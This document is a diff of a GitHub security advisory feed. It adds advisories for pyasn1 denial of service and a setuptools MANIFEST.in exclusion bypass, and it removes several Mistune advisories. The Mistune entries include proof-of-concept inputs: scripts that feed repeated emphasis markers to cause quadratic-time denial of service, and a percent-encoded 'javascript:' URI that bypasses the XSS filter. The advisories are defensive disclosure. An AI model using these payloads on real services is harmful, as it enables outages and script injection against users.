+            <uri>https://github.com/advisories/GHSA-hm4w-wwcw-mr6r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T19:11:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyasn1] pyasn1: Quadratic complexity in OBJECT IDENTIFIER and RELATIVE-OID processing allows denial of service]]></title>
+        <id>https://github.com/advisories/GHSA-8ppf-4f7h-5ppj</id>
+        <link href="https://github.com/advisories/GHSA-8ppf-4f7h-5ppj"/>
+        <updated>2026-07-21T19:11:04.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.</p>
+<p>The arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.</p>
+<h3 id="affected-components">Affected components</h3>
+<p>ObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Limit the size of untrusted ASN.1 input before decoding.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj">https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59885">https://nvd.nist.gov/vuln/detail/CVE-2026-59885</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9">https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4">https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-8ppf-4f7h-5ppj">https://github.com/advisories/GHSA-8ppf-4f7h-5ppj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8ppf-4f7h-5ppj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T19:11:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyssn1] pyasn1 BER/CER/DER decoder denial of service via unbounded long-form tag IDs]]></title>
+        <id>https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</id>
+        <link href="https://github.com/advisories/GHSA-m4p7-r5rc-7g4j"/>
+        <updated>2026-07-21T19:10:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The BER decoder (shared by the CER and DER codecs) parses long-form tags by accumulating continuation octets in a loop with no upper bound on the size of the tag ID. A crafted input can force the decoder to build an arbitrarily large integer, with CPU cost growing quadratically in input size — a ~1 MB input consumes over a minute of CPU. On Python 3.11+, the oversized tag ID can also trigger an unhandled <code>ValueError</code> (integer string conversion limit) while the decoder formats error messages, violating the documented <code>PyAsn1Error</code> contract and potentially bypassing caller error handling.</p>
+<p>Any application decoding untrusted BER/CER/DER input is affected.</p>
+<h3 id="affected-components">Affected components</h3>
+<ul>
+<li><code>pyasn1.codec.ber.decoder</code> — <code>decode()</code> and <code>StreamingDecoder</code></li>
+<li><code>pyasn1.codec.cer.decoder</code> and <code>pyasn1.codec.der.decoder</code>, which inherit
+the same tag parsing</li>
+<li><code>pyasn1.type.tag</code> — <code>Tag</code>/<code>TagSet</code> reprs could raise <code>ValueError</code> when
+rendering oversized tag IDs (reachable through decoder error paths)</li>
+</ul>
+<p>The encoders and the <code>pyasn1.codec.native</code> codec are not affected.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in 0.6.4. Long-form tag IDs are now limited to 20 octets (140-bit tag IDs, matching the existing OID arc limit); oversized tags are rejected with <code>PyAsn1Error</code>. Tag ID rendering in reprs and error messages was additionally hardened against the interpreter's integer-to-string conversion limit.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Bound the size of untrusted input passed to <code>decode()</code> before calling it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j">https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59884">https://nvd.nist.gov/vuln/detail/CVE-2026-59884</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5">https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4">https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m4p7-r5rc-7g4j">https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m4p7-r5rc-7g4j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T19:10:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[setuptools] setuptools: MANIFEST.in exclusion bypass in sdist via Unicode normalization collision (NFC/NFD) on macOS APFS/HFS+]]></title>
+        <id>https://github.com/advisories/GHSA-h35f-9h28-mq5c</id>
+        <link href="https://github.com/advisories/GHSA-h35f-9h28-mq5c"/>
+        <updated>2026-07-21T19:09:21.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When building a source distribution (<code>python -m build --sdist</code> / <code>setup.py sdist</code>), setuptools' <code>FileList</code> applies <code>MANIFEST.in</code> directives (<code>exclude</code>, <code>global-exclude</code>, <code>recursive-exclude</code>, <code>prune</code>) by matching a compiled glob against on-disk file names <strong>byte-for-byte, with no Unicode normalization</strong>. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a <code>MANIFEST.in</code> rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the <code>.tar.gz</code> and, if published, uploaded to the public, immutable PyPI index.</p>
+<h2 id="details">Details</h2>
+<p>File names in <code>FileList.files</code> come from <code>os.walk</code> (<code>setuptools/_distutils/filelist.py</code>, <code>_find_all_simple</code>), so on APFS a file written NFD is offered to the matcher in NFD, while the <code>MANIFEST.in</code> pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:</p>
+<pre><code class="language-python"># setuptools/command/egg_info.py  (FileList.global_exclude)
+def global_exclude(self, pattern):
+    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -&gt; regex, no NFC/NFD
+    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names
+</code></pre>
+<p>A rule written NFC (<code>café</code> = <code>63 61 66 c3 a9</code>) does not match an on-disk name written NFD (<code>café</code> = <code>63 61 66 65 cc 81</code>), even though the filesystem treats the two as one file.</p>
+<p>A <code>unicodedata.normalize('NFD', ...)</code> helper exists in <code>setuptools/unicode_utils.py</code> (<code>decompose()</code>), but it is <strong>never called in the manifest matching path</strong>, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, <code>EggInfoCommand._manifest_normalize</code>, uses <code>filesys_decode</code> (bytes→str decode only, no NFC/NFD) and runs when writing <code>SOURCES.txt</code>, after matching has already occurred.</p>
+<h2 id="impact">Impact</h2>
+<p><code>MANIFEST.in</code> exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule — an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>With a project containing <code>MANIFEST.in</code>:</p>
+<pre><code>global-include *.txt *.json
+global-exclude secret_café.txt    # rule saved NFC
+</code></pre>
+<p>and an on-disk file <code>secret_café.txt</code> written in NFD, <code>python -m build --sdist</code> packs the secret file into the resulting <code>.tar.gz</code>, while an ASCII control file excluded by the same directive is correctly dropped — isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Normalize both the walked path and each <code>MANIFEST.in</code> pattern to a single canonical form before matching, in both <code>setuptools/command/egg_info.py</code> (<code>FileList</code>) and the vendored <code>setuptools/_distutils/filelist.py</code>. For an exclusion list, err toward excluding more, and document that <code>MANIFEST.in</code> matching is normalization-insensitive on macOS.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pypa/setuptools/security/advisories/GHSA-h35f-9h28-mq5c">https://github.com/pypa/setuptools/security/advisories/GHSA-h35f-9h28-mq5c</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59890">https://nvd.nist.gov/vuln/detail/CVE-2026-59890</a></li>
+<li><a href="https://github.com/pypa/setuptools/commit/dd9f436a36486b4cb8a4c70a2321548b0be09b8f">https://github.com/pypa/setuptools/commit/dd9f436a36486b4cb8a4c70a2321548b0be09b8f</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2026-3447.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2026-3447.yaml</a></li>
+<li><a href="https://github.com/pypa/setuptools/releases/tag/v83.0.0">https://github.com/pypa/setuptools/releases/tag/v83.0.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-h35f-9h28-mq5c">https://github.com/advisories/GHSA-h35f-9h28-mq5c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h35f-9h28-mq5c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:09:21.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nova] OpenStack Nova: Nova scheduler hint injection bypasses Placement resource claims and scheduling constraints]]></title>
         <id>https://github.com/advisories/GHSA-mfg3-p6m3-gjgr</id>
@@ -1514,585 +2044,5 @@ print(result)
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-20T21:34:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune plugins/formatting: quadratic-time parsing on long runs of `~~x~~`, `==x==`, and `^^x^^` markers (strikethrough / mark / insert)]]></title>
-        <id>https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</id>
-        <link href="https://github.com/advisories/GHSA-c8j7-8cv4-2xmq"/>
-        <updated>2026-07-20T21:34:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Type:</strong> Algorithmic-complexity denial of service. A run of N closed pairs <code>~~x~~~~x~~...</code> (or the analogous <code>==x==</code> for <code>mark</code>, <code>^^x^^</code> for <code>insert</code>) causes O(N²) work in the formatting parser. With the <code>strikethrough</code>, <code>mark</code>, or <code>insert</code> plugin enabled, an 8 KB input pegs the CPU for ~4 seconds; 16 KB → ~17 seconds. 
-<strong>File:</strong> <code>src/mistune/plugins/formatting.py</code>, lines 13-15 (the <code>_STRIKE_END</code> / <code>_MARK_END</code> / <code>_INSERT_END</code> patterns and their per-position scan).
-<strong>Root cause:</strong> for each opening <code>~~</code>/<code>==</code>/<code>^^</code> the parser scans forward for the matching close pattern. The scan itself uses a bounded regex, but the parser tries the close-scan at every potential start position. For input shaped like <code>~~x~~</code> repeated N times, every <code>~~</code> is examined as a possible start, each scan covers up to the end of input. Total work is O(N²). Default config without these plugins handles the same input in linear time (4 ms for 4000 reps), confirming the cost is in the formatting plugin's per-marker scan, not in core parsing.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><strong>File:</strong> <code>src/mistune/plugins/formatting.py</code>, lines 12-16.</p>
-<pre><code class="language-python">_STRIKE_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\~|[^\s~])~~(?!~)")
-_MARK_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\=|[^\s=])==(?!=)")
-_INSERT_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\^|[^\s^])\^\^(?!\^)")
-# Each pattern is scanned forward from every start position fired by the
-# corresponding inline rule. The end-pattern itself is bounded; the cost
-# comes from the surrounding parser invoking the scan at every '~~' / '==' / '^^'
-# token in the input, giving N starts × O(N) per scan = O(N^2) total.
-</code></pre>
-<p><strong>Why it's wrong:</strong> the same algorithmic-complexity flaw class as <code>[</code> / <code>[a</code> parsing in core: a per-token retry loop without memoisation of failed positions. Each formatting marker is tried as both a potential start and as a continuation. A linear-pass delimiter-stack algorithm (matching how <code>commonmark-py</code> and <code>markdown-it-py</code> handle emphasis) would do this work in O(N) total. The bounded regex on each individual scan does not bound the parser-level repetition.</p>
-<h2 id="exploit-chain">Exploit Chain</h2>
-<ol>
-<li>Application uses mistune to render user-supplied markdown and has any of the formatting plugins enabled (<code>plugins=['strikethrough']</code>, <code>['mark']</code>, <code>['insert']</code>, or any superset). These plugins are commonly enabled because GitHub-flavoured-Markdown compatibility requires <code>~~strikethrough~~</code> and many editors emit <code>==highlighting==</code> and <code>^^underline^^</code> shortcuts.</li>
-<li>Attacker submits an 8 KB markdown payload of the form <code>~~x~~~~x~~~~x~~...</code> (40 000 characters of <code>~~x~~</code> repeated 8000 times, or the analogous shape with <code>==</code> / <code>^^</code>).</li>
-<li>Server calls <code>mistune.create_markdown(plugins=['strikethrough'])(payload)</code>. CPU pegs for ~4 seconds; 16 KB → ~17 seconds; 32 KB → ~70 seconds. Pure CPU cost, no significant memory growth.</li>
-<li>Repeating the request floods the worker pool. On a single-thread WSGI handler this is one request per outage; on a thread pool, a small number of concurrent attackers exhausts capacity.</li>
-</ol>
-<h2 id="security-impact">Security Impact</h2>
-<p><strong>Severity:</strong> sec-high. Network-reachable, no authentication, predictable scaling, single-payload primitive. Only requires a user-supplied markdown sink and a formatting plugin enabled — both are common.
-<strong>Attacker capability:</strong> small input → large CPU. Doubling input size quadruples CPU time. Sustained requests deny service to other users.
-<strong>Preconditions:</strong> application uses mistune with any of <code>strikethrough</code>, <code>mark</code>, or <code>insert</code> plugins enabled. Default config does NOT enable these (so the attack only fires against the substantial deployed population that turns them on for GFM/markdown-extra compatibility).
-<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>:</p>
-<pre><code class="language-python">import mistune, time
-md = mistune.create_markdown(plugins=['strikethrough'])
-for n in [500, 1000, 2000, 4000, 8000]:
-    s = '~~x~~' * n
-    t = time.time()
-    md(s)
-    print(f'  ~~x~~ * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')
-
-# Output (Python 3.13, Linux, 2.5GHz CPU):
-#   ~~x~~ *  500  (2500b):    19ms
-#   ~~x~~ * 1000  (5000b):    71ms
-#   ~~x~~ * 2000 (10000b):   272ms
-#   ~~x~~ * 4000 (20000b):  1090ms
-#   ~~x~~ * 8000 (40000b):  4302ms
-
-# Identical scaling for `==x==` (mark) and `^^x^^` (insert):
-md = mistune.create_markdown(plugins=['mark'])
-md('==x==' * 4000)   # ~1100ms
-md = mistune.create_markdown(plugins=['insert'])
-md('^^x^^' * 4000)   # ~1080ms
-
-# Without the plugin, the same input parses in linear time:
-md = mistune.create_markdown()  # no plugins
-md('~~x~~' * 4000)               # 4ms (1000x faster)
-</code></pre>
-<p>The patched build (with the suggested fix below — either a delimiter-stack rewrite or a hard cap on the number of unmatched markers tracked) keeps the time linear in N.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>The minimal fix is to cap the number of simultaneously-tracked unmatched markers, treating extras as literal text. The proper fix is a single-pass delimiter-stack algorithm matching the CommonMark reference implementation. Surgical patch:</p>
-<pre><code class="language-diff">--- a/src/mistune/plugins/formatting.py
-+++ b/src/mistune/plugins/formatting.py
-@@ ... in the parse_strikethrough / parse_mark / parse_insert functions
-+    # Bound the number of open markers the parser will track concurrently.
-+    # Inputs with more than this many open ~~ / == / ^^ in flight are
-+    # almost certainly adversarial; CommonMark gives no semantics to
-+    # deeply nested unmatched markers.
-+    MAX_OPEN_MARKERS = 100
-+    if open_marker_count &gt; MAX_OPEN_MARKERS:
-+        # treat remaining markers as literal text, do not invoke the
-+        # forward-scan to find a close
-+        ...
-</code></pre>
-<p>A regression test should assert that <code>md('~~x~~' * 50_000)</code> completes in under 1 second. The same fix shape applies to <code>_MARK_END</code> and <code>_INSERT_END</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-c8j7-8cv4-2xmq">https://github.com/lepture/mistune/security/advisories/GHSA-c8j7-8cv4-2xmq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59922">https://nvd.nist.gov/vuln/detail/CVE-2026-59922</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/96d0f57f8fe9eeb06bb4cff521962a27d7c402e7">https://github.com/lepture/mistune/commit/96d0f57f8fe9eeb06bb4cff521962a27d7c402e7</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2210.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2210.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8j7-8cv4-2xmq">https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T21:34:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune: XSS via unescaped class option in Admonition directive]]></title>
-        <id>https://github.com/advisories/GHSA-g97x-gvcm-x72h</id>
-        <link href="https://github.com/advisories/GHSA-g97x-gvcm-x72h"/>
-        <updated>2026-07-20T21:34:18.000Z</updated>
-        <content type="html"><![CDATA[<p>In <code>src/mistune/directives/admonition.py</code>, the <code>render_admonition()</code> function concatenates the <code>:class:</code> option directly into the HTML class attribute without escaping (lines 63-68).</p>
-<p>This allows attribute injection and XSS even when <code>HTMLRenderer(escape=True)</code> is used.</p>
-<p>The directive name parameter is safe (validated against whitelist), but the class option comes from raw user input.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-g97x-gvcm-x72h">https://github.com/lepture/mistune/security/advisories/GHSA-g97x-gvcm-x72h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59926">https://nvd.nist.gov/vuln/detail/CVE-2026-59926</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/a3cb6e5655308797e8be021d6c7b5bab13cbace2">https://github.com/lepture/mistune/commit/a3cb6e5655308797e8be021d6c7b5bab13cbace2</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.2.1">https://github.com/lepture/mistune/releases/tag/v3.2.1</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2214.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2214.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-g97x-gvcm-x72h">https://github.com/advisories/GHSA-g97x-gvcm-x72h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g97x-gvcm-x72h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T21:34:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune: XSS via percent-encoded javascript URI bypass in safe_url()]]></title>
-        <id>https://github.com/advisories/GHSA-8c25-4j27-2rv3</id>
-        <link href="https://github.com/advisories/GHSA-8c25-4j27-2rv3"/>
-        <updated>2026-07-20T21:32:52.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An XSS vulnerability in Mistune allows bypassing of safe_url() protections via percent-encoded javascript URIs.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability exists in HTMLRenderer.safe_url() in Mistune.</p>
-<p>The function is intended to block harmful URL schemes such as "javascript:" by checking the prefix of the provided URL:</p>
-<pre><code>_url = url.lower()
-if _url.startswith(self.HARMFUL_PROTOCOLS):
-    return "#harmful-link"
-</code></pre>
-<p>However, the input URL is not URL-decoded before this check. Because of this, an attacker can use percent-encoding to bypass the filter. For example:</p>
-<pre><code>javascript%3Aalert(1)
-</code></pre>
-<p>Since "%3A" is not decoded to ":", the check does not detect the "javascript:" scheme.</p>
-<p>When rendered in a browser, the URL is decoded, resulting in execution of arbitrary JavaScript upon user interaction.</p>
-<p>This effectively bypasses Mistune's built-in safe_url() protection mechanism.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li><p>Install vulnerable version:</p>
-<p> pip install mistune==3.2.0</p>
-</li>
-<li><p>Run the following code:</p>
-<p> import mistune</p>
-<p> markdown = mistune.create_markdown()
- html = markdown("<a href="javascript%3Aalert(1)">j</a>")</p>
-<p> print(html)</p>
-</li>
-<li><p>Output:</p>
- <p><a href="javascript%3Aalert(1)">j</a></p>
-</li>
-<li><p>Open the rendered HTML in a browser and click the link.</p>
-</li>
-<li><p>The browser decodes "%3A" into ":" and executes:</p>
-<p> javascript:alert(1)</p>
-</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>This is a cross-site scripting (XSS) vulnerability.</p>
-<p>An attacker can craft a malicious Markdown link that executes JavaScript in the victim's browser when clicked.</p>
-<p>Impact includes:</p>
-<ul>
-<li>Session hijacking (e.g., cookie theft)</li>
-<li>Execution of arbitrary JavaScript in the victim's context</li>
-<li>Potential account takeover depending on the application</li>
-</ul>
-<p>This affects any application that renders user-controlled Markdown using Mistune without additional URL sanitization.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8c25-4j27-2rv3">https://github.com/lepture/mistune/security/advisories/GHSA-8c25-4j27-2rv3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59923">https://nvd.nist.gov/vuln/detail/CVE-2026-59923</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc">https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2211.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2211.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-8c25-4j27-2rv3">https://github.com/advisories/GHSA-8c25-4j27-2rv3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8c25-4j27-2rv3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T21:32:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune inline_parser: quadratic-time parsing on long runs of `**x**` and `***x***` emphasis pairs]]></title>
-        <id>https://github.com/advisories/GHSA-4j32-57v6-6g45</id>
-        <link href="https://github.com/advisories/GHSA-4j32-57v6-6g45"/>
-        <updated>2026-07-20T21:32:42.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Type:</strong> Algorithmic-complexity DoS in core emphasis parsing. A long sequence of well-formed <code>**x**</code> (strong) or <code>***x***</code> (strong-emphasis combined) pairs causes O(N²) parser work. Distinct from the bracket-bomb DoS (<code>[</code> repetition) and from the formatting-plugin DoS (<code>~~</code>/<code>==</code>/<code>^^</code>); this one fires on default-config mistune with no plugins required.
-<strong>File:</strong> <code>src/mistune/inline_parser.py</code> lines 41-48 (the <code>EMPHASIS_END_RE</code> family) and the surrounding emphasis dispatch.
-<strong>Root cause:</strong> for every opening run of <code>*</code>s the parser scans forward using one of <code>EMPHASIS_END_RE['*']</code> / <code>['**']</code> / <code>['***']</code> to find the matching close. Each scan is bounded per call, but the parser invokes the scan from every potential start position. For input shaped <code>**x**</code> repeated N times, every <code>**</code> is treated as a potential start, each scan can cover up to the end of input. Total work is O(N²). The triple-emphasis variant <code>***x***</code> is slightly worse due to the extra alternation between <code>*</code>, <code>**</code>, and <code>***</code> close patterns. Reproducible against default mistune with no plugins.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><strong>File:</strong> <code>src/mistune/inline_parser.py</code>, lines 41-48.</p>
-<pre><code class="language-python">EMPHASIS_END_RE = {
-    "*": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*(?!\*)"),
-    "_": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])_(?!_)\b"),
-    "**": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*\*(?!\*)"),
-    "__": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])__(?!_)\b"),
-    "***": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*\*\*(?!\*)"),
-    "___": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])___(?!_)\b"),
-}
-# Each of the six end-patterns is invoked from every emphasis open position
-# fired by the inline rule `r"\*{1,3}(?=[^\s*])|\b_{1,3}(?=[^\s_])"`. The
-# scan itself is bounded per call; the cost comes from the parser invoking
-# the scan at every matching open marker, giving O(N²) total work.
-</code></pre>
-<p><strong>Why it's wrong:</strong> same shape as the formatting-plugin and bracket-bomb DoS findings. The CommonMark reference parser handles emphasis in linear time using a delimiter-stack algorithm (<code>commonmark.js</code>, <code>commonmark-py</code>, <code>markdown-it-py</code> all do this). mistune retries the close-scan from each open marker. The bounded regex is not enough; the surrounding loop is the source of the quadratic.</p>
-<h2 id="exploit-chain">Exploit Chain</h2>
-<ol>
-<li>Application uses mistune to render user-supplied markdown. No plugins required — affects the default <code>mistune.create_markdown()</code> configuration.</li>
-<li>Attacker submits a 40 KB payload of <code>**x**</code> repeated 8000 times.</li>
-<li>Server CPU pegs for ~4 seconds; 16 KB → ~17 seconds. Doubling input quadruples time.</li>
-<li>Repeating the request floods the worker pool.</li>
-</ol>
-<h2 id="security-impact">Security Impact</h2>
-<p><strong>Severity:</strong> sec-high. Network-reachable, no authentication, no plugin requirement. Default mistune is vulnerable.
-<strong>Attacker capability:</strong> O(N²) CPU cost from a single small input. Predictable scaling, easy to combine with concurrent requests for service denial.
-<strong>Preconditions:</strong> application uses <code>mistune.create_markdown()</code> (default config) on attacker-supplied markdown. No plugins required.
-<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>, default config:</p>
-<pre><code class="language-python">import mistune, time
-md = mistune.create_markdown()                     # no plugins
-for n in [500, 1000, 2000, 4000, 8000]:
-    s = '**x**' * n
-    t = time.time()
-    md(s)
-    print(f'  **x** * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')
-
-# Output (Python 3.13, Linux, 2.5GHz CPU):
-#   **x** *  500  (2500b):    20ms
-#   **x** * 1000  (5000b):    74ms
-#   **x** * 2000 (10000b):   284ms
-#   **x** * 4000 (20000b):  1079ms
-#   **x** * 8000 (40000b):  4309ms
-
-# Triple-emphasis is similar:
-md('***x***' * 4000)   # ~1500ms
-
-# Linear in N for non-emphasis input of comparable size:
-md('xxxxx' * 8000)     # 1ms (4000x faster)
-</code></pre>
-<p>The patched build (with the suggested fix below — delimiter-stack rewrite or hard cap on simultaneous open markers) keeps the time linear in N.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Cap the number of unmatched opening emphasis markers the parser will track simultaneously, treating the rest as literal text:</p>
-<pre><code class="language-diff">--- a/src/mistune/inline_parser.py
-+++ b/src/mistune/inline_parser.py
-@@ ... in the emphasis-handling code path
-+    # Bound the number of open emphasis markers tracked. CommonMark gives
-+    # no semantics to deeply nested unmatched emphasis; this cap turns the
-+    # parser-level O(N^2) into O(N) for adversarial inputs while preserving
-+    # behaviour on every realistic markdown document.
-+    MAX_OPEN_EMPHASIS = 100
-+    if open_emphasis_count &gt; MAX_OPEN_EMPHASIS:
-+        # treat remaining * / _ as literal text
-+        ...
-</code></pre>
